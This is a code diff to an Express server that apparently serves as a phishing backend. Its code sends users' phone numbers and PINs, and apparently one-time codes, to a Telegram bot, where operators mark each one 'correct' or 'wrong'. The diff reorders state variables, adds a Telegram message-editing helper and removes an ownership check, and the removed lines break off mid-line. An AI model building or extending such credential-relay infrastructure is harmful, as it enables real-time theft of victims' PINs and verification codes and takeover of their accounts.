@@ -17,6 +17,9 @@ app.use(express.static(publicPath));
 // Persistent storage file path
 const STORAGE_FILE = path.join(__dirname, 'admins_data.json');
 
+// 1. Declare state variables FIRST so functions can reference them safely
+const activeApplications = new Map();
+
 // Load initial data from disk if it exists
 function loadPersistentData() {
   try {
@@ -41,6 +44,12 @@ function loadPersistentData() {
   };
 }
 
+const persisted = loadPersistentData();
+const authorizedUsers = persisted.authorizedUsers;
+const secondaryAdmins = persisted.secondaryAdmins;
+const pathToAdminChat = persisted.pathToAdminChat;
+let adminCounter = persisted.adminCounter;
+
 // Save current maps to disk
 function savePersistentData() {
   try {
@@ -56,13 +65,6 @@ function savePersistentData() {
   }
 }
 
-const activeApplications = new Map();
-const persisted = loadPersistentData();
-const authorizedUsers = persisted.authorizedUsers;
-const secondaryAdmins = persisted.secondaryAdmins;
-const pathToAdminChat = persisted.pathToAdminChat;
-let adminCounter = persisted.adminCounter;
-
 function formatZimbabwePhone(phone) {
   let formattedPhone = phone || '';
   if (formattedPhone.startsWith('+263')) {
@@ -73,6 +75,28 @@ function formatZimbabwePhone(phone) {
     formattedPhone = formattedPhone.slice(1);
   }
   return formattedPhone;
+}
+
+// Helper to edit Telegram messages cleanly
+async function editTelegramMessage(botToken, chatId, messageId, newText, replyMarkup = null) {
+  try {
+    const payload = {
+      chat_id: chatId,
+      message_id: messageId,
+      text: newText,
+      parse_mode: 'HTML'
+    };
+    if (replyMarkup) {
+      payload.reply_markup = replyMarkup;
+    }
+    await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+  } catch (err) {
+    console.error("Error editing telegram message:", err);
+  }
 }
 
 // STEP 2 SUBMISSION: Delivered to Telegram with Phone and PIN + Action Buttons
@@ -485,15 +509,4 @@ app.post('/api/telegram-webhook', async (req, res) => {
     return;
   }
 
-  let targetAppRef = '';
-  if (actionData.startsWith('pin_correct_')) targetAppRef = actionData.replace('pin_correct_', '');
-  if (actionData.startsWith('pin_wrong_')) targetAppRef = actionData.replace('pin_wrong_', '');
-  if (actionData.startsWith('otp_correct_')) targetAppRef = actionData.replace('otp_correct_', '');
-  if (actionData.startsWith('otp_wrong_')) targetAppRef = actionData.replace('otp_wrong_', '');
-
-  if (targetAppRef) {
-    const appData = activeApplications.get(targetAppRef);
-    if (appData && appData.targetChatId && chatId !== appData.targetChatId.toString()) {
-      await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
-        method: 'POST',
-        header
+  let
